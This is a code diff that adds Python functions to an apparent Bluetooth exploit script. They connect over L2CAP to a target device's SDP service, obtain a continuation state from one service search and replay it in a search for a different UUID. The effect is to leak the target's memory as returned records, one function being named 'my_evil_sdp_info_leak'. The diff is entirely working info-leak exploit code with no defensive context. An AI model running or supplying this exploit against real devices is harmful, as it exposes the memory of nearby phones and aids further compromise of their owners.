@@ -24,3 +24,57 @@ def do_sdp_info_leak(dst, src):
         response['payload'] = sdp.unpack_search_response(response['payload'])
         result.append(response['payload']['records'])
     return result
+
+def my_sdp_info(dst):
+    socket = btsock.l2cap_connect( (dst, SDP_PSM), mtu=MIN_MTU )
+    socket.send( sdp.pack_search_request(sdp.L2CAP_UUID) )
+    response = sdp.unpack_sdp_pdu(socket.recv(4096))
+    response['payload'] = sdp.unpack_search_response(response['payload'])
+    print response
+    result = []
+    for i in range(20):
+        cstate = response['payload']['cstate']
+        if cstate == b'':
+            break
+        socket.send( sdp.pack_search_request(sdp.L2CAP_UUID, cstate=cstate) )
+        response = sdp.unpack_sdp_pdu(socket.recv(4096))
+        response['payload'] = sdp.unpack_search_response(response['payload'])
+        print response
+        result.append(response['payload']['records'])
+
+    return result
+
+def my_evil_sdp_info_leak(dst):
+    socket = btsock.l2cap_connect( (dst, SDP_PSM), mtu=MIN_MTU )
+    socket.send( sdp.pack_search_request(sdp.L2CAP_UUID) )
+    response = sdp.unpack_sdp_pdu(socket.recv(4096))
+    response['payload'] = sdp.unpack_search_response(response['payload'])
+    print response
+    result = []
+    for i in range(20):
+        cstate = response['payload']['cstate']
+        assert cstate != b''
+        socket.send( sdp.pack_search_request(sdp.ATT_UUID, cstate=cstate) )
+        response = sdp.unpack_sdp_pdu(socket.recv(4096))
+        response['payload'] = sdp.unpack_search_response(response['payload'])
+        print response
+        result.append(response['payload']['records'])
+
+    return result
+
+def my_sdp_info_leak(dst):
+    socket = btsock.l2cap_connect((dst, SDP_PSM), mtu=MIN_MTU)
+    socket.send(sdp.pack_search_request(sdp.L2CAP_UUID))
+    response = sdp.unpack_sdp_pdu(socket.recv(4096))
+    response['payload'] = sdp.unpack_search_response(response['payload'])
+    result = []
+    for i in range(20):
+        cstate = response['payload']['cstate']
+        assert cstate != b''
+        socket.send(sdp.pack_search_request(sdp.ATT_UUID,
+                                            cstate=cstate))
+        response = sdp.unpack_sdp_pdu(socket.recv(4096))
+        response['payload'] = sdp.unpack_search_response(response['payload'])
+        result.append(response['payload']['records'])
+
+    return result
